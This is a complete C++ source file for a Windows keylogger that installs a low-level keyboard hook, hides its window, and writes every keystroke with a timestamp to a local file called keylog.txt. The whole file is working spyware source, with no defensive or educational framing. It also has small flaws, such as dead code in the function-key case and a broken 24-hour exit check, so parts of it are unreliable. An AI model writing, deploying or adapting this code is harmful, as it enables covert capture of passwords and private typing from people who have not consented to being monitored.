#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <string>

// Global variables
HHOOK hKeyboardHook = NULL;
FILE* logFile = NULL;
SYSTEMTIME startTime;

// Function to get current timestamp
std::string GetTimeStamp()
{
	SYSTEMTIME st;
	GetLocalTime(&st);

	char buffer[128];
	sprintf_s(buffer, "[%02d/%02d/%04d %02d:%02d:%02d] ",
		st.wDay, st.wMonth, st.wYear,
		st.wHour, st.wMinute, st.wSecond);

	return std::string(buffer);
}

// Function to get key name from virtual key code
std::string GetKeyName(DWORD vkCode)
{
	char keyName[128];

	// Special cases
	switch (vkCode)
	{
	case VK_RETURN: return "[ENTER]";
	case VK_BACK: return "[BACKSPACE]";
	case VK_TAB: return "[TAB]";
	case VK_SPACE: return " ";
	case VK_SHIFT: return "[SHIFT]";
	case VK_CONTROL: return "[CTRL]";
	case VK_MENU: return "[ALT]";
	case VK_CAPITAL: return "[CAPSLOCK]";
	case VK_ESCAPE: return "[ESC]";
	case VK_PRIOR: return "[PAGEUP]";
	case VK_NEXT: return "[PAGEDOWN]";
	case VK_END: return "[END]";
	case VK_HOME: return "[HOME]";
	case VK_LEFT: return "[LEFT]";
	case VK_UP: return "[UP]";
	case VK_RIGHT: return "[RIGHT]";
	case VK_DOWN: return "[DOWN]";
	case VK_INSERT: return "[INSERT]";
	case VK_DELETE: return "[DEL]";
	case VK_LWIN: return "[WIN]";
	case VK_RWIN: return "[WIN]";
	case VK_NUMPAD0: return "0";
	case VK_NUMPAD1: return "1";
	case VK_NUMPAD2: return "2";
	case VK_NUMPAD3: return "3";
	case VK_NUMPAD4: return "4";
	case VK_NUMPAD5: return "5";
	case VK_NUMPAD6: return "6";
	case VK_NUMPAD7: return "7";
	case VK_NUMPAD8: return "8";
	case VK_NUMPAD9: return "9";
	case VK_MULTIPLY: return "*";
	case VK_ADD: return "+";
	case VK_SUBTRACT: return "-";
	case VK_DECIMAL: return ".";
	case VK_DIVIDE: return "/";
	case VK_F1: return "F1";
	case VK_F2: return "F2";
	case VK_F3: return "F3";
	case VK_F4: return "F4";
	case VK_F5: return "F5";
	case VK_F6: return "F6";
	case VK_F7: return "F7";
	case VK_F8: return "F8";
	case VK_F9: return "F9";
	case VK_F10: return "F10";
	case VK_F11: return "F11";
	case VK_F12: return "F12";
	{
		sprintf_s(keyName, "[F%d]", vkCode - VK_F1 + 1);
		return keyName;
	}
	}

	// Get keyboard state
	BYTE keyboardState[256];
	GetKeyboardState(keyboardState);

	// Get key name
	char buffer[16] = { 0 };
	int result = ToAscii(vkCode, MapVirtualKey(vkCode, 0), keyboardState, (LPWORD)buffer, 0);

	if (result == 1)
	{
		// Single character
		keyName[0] = buffer[0];
		keyName[1] = '\0';
	}
	else
	{
		// Unknown key
		sprintf_s(keyName, "[VK%02X]", vkCode);
	}

	return keyName;
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		KBDLLHOOKSTRUCT* pKeyInfo = (KBDLLHOOKSTRUCT*)lParam;

		// Only log key down events
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			std::string keyName = GetKeyName(pKeyInfo->vkCode);
			fprintf(logFile, "%s%s\n", GetTimeStamp().c_str(), keyName.c_str());
			fflush(logFile);

			// Check if 24 hours have passed
			SYSTEMTIME currentTime;
			GetLocalTime(&currentTime);

			if ((currentTime.wDay != startTime.wDay) ||
				(currentTime.wDay == startTime.wDay && currentTime.wHour >= startTime.wHour + 24))
			{
				// 24 hours have passed - exit
				PostQuitMessage(0);
			}
		}
	}

	// Pass to next hook
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Hide window
void HideWindow()
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Get start time
	GetLocalTime(&startTime);

	// Open log file (create if doesn't exist, append if exists)
	fopen_s(&logFile, "keylog.txt", "a");
	if (!logFile)
	{
		MessageBox(NULL, L"Failed to open log file", L"Error", MB_ICONERROR);
		return 1;
	}

	// Write header
	fprintf(logFile, "\n=== Keylogger started at %02d/%02d/%04d %02d:%02d ===\n",
		startTime.wDay, startTime.wMonth, startTime.wYear,
		startTime.wHour, startTime.wMinute);
	fflush(logFile);

	// Hide the window
	HideWindow();

	// Set keyboard hook
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
	if (!hKeyboardHook)
	{
		MessageBox(NULL, L"Failed to install keyboard hook", L"Error", MB_ICONERROR);
		fclose(logFile);
		return 1;
	}

	// Message loop
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Cleanup
	if (hKeyboardHook)
	{
		UnhookWindowsHookEx(hKeyboardHook);
	}

	// Write footer
	SYSTEMTIME endTime;
	GetLocalTime(&endTime);
	fprintf(logFile, "=== Keylogger stopped at %02d/%02d/%04d %02d:%02d ===\n\n",
		endTime.wDay, endTime.wMonth, endTime.wYear,
		endTime.wHour, endTime.wMinute);

	if (logFile)
	{
		fclose(logFile);
	}

	return 0;
}